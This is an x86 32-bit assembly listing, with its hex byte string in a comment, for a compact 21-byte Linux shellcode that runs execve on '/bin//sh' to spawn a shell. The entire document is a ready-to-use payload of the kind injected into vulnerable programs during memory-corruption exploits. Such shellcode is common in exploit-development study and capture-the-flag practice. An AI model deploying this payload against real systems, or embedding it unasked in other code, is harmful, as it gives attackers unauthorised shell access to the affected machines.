; 21 Bytes shellcode
; \x31\xc9\x6a\x0b\x58\x99\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
BITS 32
  xor ecx, ecx
  push BYTE 11
  pop eax
  cdq
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  int 0x80
